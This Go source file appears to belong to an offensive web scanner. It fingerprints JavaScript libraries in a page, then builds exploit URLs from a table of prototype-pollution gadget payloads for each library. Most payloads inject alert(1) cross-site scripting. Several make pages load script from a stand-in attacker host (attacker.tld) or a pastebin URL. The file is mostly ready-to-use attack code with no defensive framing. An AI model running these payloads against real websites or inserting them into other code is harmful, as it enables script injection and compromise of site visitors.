package gadgets

import (
	"fmt"
	"strings"
)

var Fingerprint string = `(() => {
    let gadgets = 'default';
    
    if (typeof _satellite !== 'undefined') {
        gadgets = 'Adobe Dynamic Tag Management ';
    } else if (typeof BOOMR !== 'undefined') {
        gadgets = 'Akamai Boomerang ';
    } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
        gadgets = 'Closure ';
    } else if (typeof DOMPurify !== 'undefined') {
        gadgets = 'DOMPurify ';
    } else if (typeof window.embedly !== 'undefined') {
        gadgets = 'Embedly Cards ';
    } else if (typeof filterXSS !== 'undefined') {
        gadgets = 'js-xss ';
    } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
        gadgets = 'Knockout.js ';
    } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
        gadgets = 'Lodash <= 4.17.15 ';
    } else if (typeof Marionette !== 'undefined') {
        gadgets = 'Marionette.js / Backbone.js ';
    } else if (typeof recaptcha !== 'undefined') {
        gadgets = 'Google reCAPTCHA ';
    } else if (typeof sanitizeHtml !== 'undefined') {
        gadgets = 'sanitize-html ';
    } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
        gadgets = 'Segment Analytics.js ';
    } else if (typeof Sprint !== 'undefined') {
        gadgets = 'Sprint.js ';
    } else if (typeof SwiftypeObject !== 'undefined') {
        gadgets = 'Swiftype Site Search ';
    } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
        gadgets = 'Tealium Universal Tag ';
    } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
        gadgets = 'Twitter Universal Website Tag ';
    } else if (typeof wistiaEmbeds !== 'undefined') {
        gadgets = 'Wistia Embedded Video ';
    } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
        gadgets = 'Zepto.js ';
    } else if (typeof Vue !== 'undefined') {
        gadgets = "Vue.js";
    } else if (typeof Popper !== 'undefined') {
        gadgets = "Popper.js";
    } else if (typeof pendo !== 'undefined') {
        gadgets = "Pendo Agent";
    } else if (typeof i18next !== 'undefined') {
        gadgets = "i18next";
    } else if (typeof Demandbase !== 'undefined') {
        gadgets = "Demandbase Tag";
    } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
        gadgets = "Google Tag Manager plugin for analytics";
    } else if (typeof can !== 'undefined' && typeof can.deparam !== 'undefined') {
        gadgets = "CanJS deparam";
    } else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
        gadgets = "jQuery parseParams";
    } else if (typeof String.parseQueryString !== 'undefined') {
        gadgets = "MooTools More";
    } else if (typeof mutiny !== 'undefined') {
        gadgets = "Mutiny";
    } else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
        gadgets = "AMP";
    } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
        gadgets = 'jQuery';
    }

    // Check for React and other libraries in script sources
    Array.from(document.scripts).forEach(script => {
        if (script.src.includes('react')) {
            gadgets += 'React ';
        } else if (script.src.includes('angular')) {
            gadgets += 'Angular ';
        } else if (script.src.includes('vue')) {
            gadgets += 'Vue.js ';
        } else if (script.src.includes('backbone')) {
            gadgets += 'Backbone.js ';
        } else if (script.src.includes('ember')) {
            gadgets += 'Ember.js ';
        }
    });

    console.log(gadgets);
    return gadgets;
})();

`

// GadGets func
func Gad(exp, resp, fullurl string) []string {
	var out []string
	gadgetsPayloads := map[string]string{
		"Adobe Dynamic Tag Management":  "__proto__[src]data:,alert(1)//",
		"Akamai Boomerang":              "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js",
		"Closure":                       "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//",
		"DOMPurify":                     "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src",
		"Embedly":                       "__proto__[onload]=alert(1)",
		"jQuery":                        "__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x",
		"js-xss":                        "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src",
		"Knockout.js":                   "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,",
		"Lodash <= 4.17.15":             "__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)",
		"Marionette.js / Backbone.js":   "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)",
		"Google reCAPTCHA":              "__proto__[srcdoc]=<script>alert(1)</script>",
		"sanitize-html":                 "__proto__[*][]=onload&__proto__[innerText]=<script>alert(1)</script>",
		"Segment Analytics.js":          "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror=alert(1)>&__proto__[script][2]=1",
		"Sprint.js":                     "__proto__[div][intro]=<img src onerror=alert(1)>",
		"Swiftype Site Search":          "__proto__[xxx]=alert(1)",
		"Tealium Universal Tag":         "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js",
		"Twitter Universal Website Tag": "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)",
		"Wistia Embedded Video":         "__proto__[innerHTML]=<img/src/onerror=alert(1)>",
		"Zepto.js":                      "__proto__[onerror]=alert(1)",
		"Vue.js":                        "__proto__[v-if]=_c.constructor('alert(1)')()",
		"Popper.js":                     "__proto__[arrow][style]=color:red;transition:all 1s&__proto__[arrow][ontransitionend]=alert(1)",
		"Pendo Agent":                   "__proto__[dataHost]=attacker.tld/js.js#",
		"i18next":                       "__proto__[lng]=a&__proto__[key]=<img/src/onerror=alert(1)>",
		"Demandbase Tag":                "__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?",
		"Google Tag Manager plugin for analytics": "__proto__[customScriptSrc]=//attacker.tld/xss.js",
		"CanJS deparam":      "__proto__[test]=test",
		"jQuery parseParams": "__proto__.test=test",
		"MooTools More":      "__proto__[test]=test",
		"Mutiny":             "__proto__.test=test",
		"AMP":                "__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb",
		"React.js":           "__proto__[dangerouslySetInnerHTML]={__html:'<img src=x onerror=alert(1)>'}",
		"AngularJS":          "__proto__[ng-click]=alert(1)",
		"D3.js":              "__proto__[src]=data:text/html,<script>alert('D3 Exploit')</script>",
		"Three.js":           "__proto__[src]=data:text/javascript,alert('Three.js Exploit')",
		"Chart.js":           "__proto__[onClick]=alert('Chart.js Exploit')",
		"Redux":              "__proto__[action]=()=>alert('Redux Exploit')",
		"Gatsby.js":          "__proto__[script][src]=data:text/javascript,alert('Gatsby.js Exploit')",
		"Next.js":            "__proto__[src]=data:text/javascript,alert('Next.js Exploit')",
		"RxJS":               "__proto__[observable]=()=>alert('RxJS Exploit')",
		"Handlebars.js":      "__proto__[template]=<img src=x onerror=alert('Handlebars.js Exploit')>",
		"Mustache.js":        "__proto__[template]=<img src=x onerror=alert('Mustache.js Exploit')>",
		"Polymer.js":         "__proto__[onready]=()=>alert('Polymer.js Exploit')",
		"Alpine.js":          "__proto__[x-on:click]=alert('Alpine.js Exploit')",
	}

	for key, val := range gadgetsPayloads {
		if strings.Contains(resp, key) {
			res := fmt.Sprintf("%s Find Payload :> %s%s", key, fullurl, val)
			fmt.Println(exp + res)
			out = append(out, fmt.Sprintf("%s :> %s%s", key, fullurl, val))
		}
	}
	return out
}
